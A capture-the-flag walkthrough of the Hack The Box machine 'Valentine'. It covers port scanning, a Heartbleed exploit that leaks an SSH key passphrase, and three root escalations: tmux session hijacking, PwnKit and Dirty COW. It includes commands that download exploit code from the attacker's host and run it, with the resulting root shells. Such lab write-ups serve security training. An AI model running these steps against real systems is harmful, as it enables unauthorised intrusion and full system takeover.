# HTB - Valentine

#### Ip: 10.10.10.79
#### Name: Valentine
#### Rating: Easy

----------------------------------------------------------------------

Valentine.png

### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I will also use the `--min-rate 10000` flag to speed the scan up.

```text
┌──(ryan㉿kali)-[~/HTB/Valentine]
└─$ sudo nmap -p-  --min-rate 10000 10.10.10.79                                               
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 09:20 CDT
Nmap scan report for 10.10.10.79
Host is up (0.079s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
```

We can enumerate further by scanning the open ports, but this time use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```text
┌──(ryan㉿kali)-[~/HTB/Valentine]
└─$ sudo nmap -sC -sV -T4 10.10.10.79 -p 22,80,443                                            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-26 09:21 CDT
Nmap scan report for 10.10.10.79
Host is up (0.062s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 964c51423cba2249204d3eec90ccfd0e (DSA)
|   2048 46bf1fcc924f1da042b3d216a8583133 (RSA)
|_  256 e62b2519cb7e54cb0ab9ac1698c67da9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_ssl-date: 2023-07-26T14:21:35+00:00; 0s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds
```

Ok cool, just three open ports here. Navigating to the site we find just a simple image, with no links or functionality:

site.png

I'll get things started by running an Nmap vuln scan against the site, to see if it can find any vulnerabilities while we manually enumerate:

```text
┌──(ryan㉿kali)-[~/HTB/Valentine]
└─$ sudo nmap --script vuln 10.10.10.79
```

While Nmap runs lets Kick off some directory fuzzing, we find a couple of interesting directories.

ferox.png

Most interesting off the bat is the `/dev` directory, which is hosting 2 files:

dev.png

Checking out the hype_key file, we see what appears to be a bunch of hex encoding:

hype_key.png

whereas the notes.txt file appears to be some personal developer notes:

notes.txt

This note also refers to the `/encode` directory which we also found with Feroxbuster. 

encoder.png

Here there is also a link to the `/decode` directory.

Lets keep those directories in mind for now and focus on the hex encoding on the hype_key file. 

If we paste the hex into CyberChef at https://gchq.github.io/CyberChef/ we see that this was an encoded private SSH key!

Lets add that to a file and try to SSH in as user hype:

key_try.png

Ok rats, looks like the key is passphrase protected/ and is still prompting for a password. Trying to use ssh2john didn't work here, so we must be missing some more info somewhere

john_fail.png

Going back to our Nmap vuln scan we find a pleasant surprise:

nmap.png

Cool! Looks like we've found a Heartbleed vulnerability! Here is a great writeup of the vulnerability:

https://crashtest-security.com/prevent-heartbleed/

Lets give it a shot

### Exploitation

Looking for an exploit I find: https://gist.github.com/eelsivart/10174134

This looks like a good script to both test and exploit the vulnerability.

We can launch it using:

```text
┌──(ryan㉿kali)-[~/HTB/Valentine]
└─$ python2 heartbleed.py -p 443 -n 20 10.10.10.79
```
With `-p` to declare the port number we're attacking and `-n` to declare the number of times to loop through the exploit (20 turned out to be overkill here)

Nice, looks like we've found some encoded text!

exploit.png

We can decode that in there terminal:

```text
┌──(ryan㉿kali)-[~/HTB/Valentine]
└─$ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d               
heartbleedbelievethehype
```

And now we can SSH in as user hype:

```text
┌──(ryan㉿kali)-[~/HTB/Valentine]
└─$ ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i hype_id_rsa hype@10.10.10.79
Enter passphrase for key 'hype_id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ whoami
hype
hype@Valentine:~$ hostname
Valentine
```

Note: due to the age of the box I had to use the `-o PubkeyAcceptedKeyTypes=+ssh-rsa` flag to be able to login successfully.

We can now grab the user.txt flag:

user_flag.png

### Privilege Escalation #1

To help with privilege escalation I'll go ahead and transfer over LinPeas to the target:

lp.png

Looking at running processes, LinPeas finds a tmux session running as root. Interesting!

All we'd need to do to hijack that session is to call it:

```text
hype@Valentine:/tmp$ ls -la /usr/bin/tmux -S /.devs/dev_sess
-rwxr-xr-x 1 root root 421944 Feb 13  2012 /usr/bin/tmux
srw-rw---- 1 root hype      0 Jul 26 08:28 /.devs/dev_sess
hype@Valentine:/tmp$  /usr/bin/tmux -S /.devs/dev_sess
```
And we a dropped into root's tmux session where we can grab the root.txt flag:

root_flag.png

### Privilege Escalation #2

Because this is such an old box there are likely several different ways to escalate privileges, but I'll also showcase just a couple more here, just for fun. 

LinPeas also discovered this target is vulnerable to CVE-2021-4034, which can be exploited with PwnKit:

pwnkit.png

```text
hype@Valentine:/tmp$ wget http://10.10.14.40/PwnKit
--2023-07-26 08:55:32--  http://10.10.14.40/PwnKit
Connecting to 10.10.14.40:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: `PwnKit'

100%[===================================================================================>] 18,040      --.-K/s   in 0.07s   

2023-07-26 08:55:32 (256 KB/s) - `PwnKit' saved [18040/18040]

hype@Valentine:/tmp$ chmod +x PwnKit
hype@Valentine:/tmp$ ./PwnKit
root@Valentine:/tmp# whoami
root
root@Valentine:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare),1000(hype)
```

### Privilege Escalation #3

The last privesc I'll show here is the classic kernel exploit dirty cow. A nice high level summary of the exploit can be found at https://dirtycow.ninja/

LinPeas to save the day once again finds that the target is 'highly probable' to be vulnerable to dirty cow:

dc.png

This exploit creates a new user firefart (such a beautiful name..) with root permissions. All we need to do is create a password (here I just used the password `pass`) for the new root user and issue `su - firefart` and we get root access to the box. We can exploit it with:

```text
hype@Valentine:/tmp$ whoami
hype
hype@Valentine:/tmp$ wget http://10.10.14.40/dirtycow.c
--2023-07-26 09:03:30--  http://10.10.14.40/dirtycow.c
Connecting to 10.10.14.40:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4814 (4.7K) [text/x-csrc]
Saving to: `dirtycow.c'

100%[===================================================================================>] 4,814       --.-K/s   in 0s      

2023-07-26 09:03:30 (220 MB/s) - `dirtycow.c' saved [4814/4814]

hype@Valentine:/tmp$ gcc -pthread dirtycow.c -o dirty -lcrypt
hype@Valentine:/tmp$ chmod +x dirty
hype@Valentine:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash

mmap: 7fbebc938000
^C
hype@Valentine:/tmp$ su - firefart
Password: 
firefart@Valentine:~# whoami
firefart
firefart@Valentine:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Valentine:~#
```

And that's that! Thank you for following along!

-Ryan

----------------------------------------------------------------------------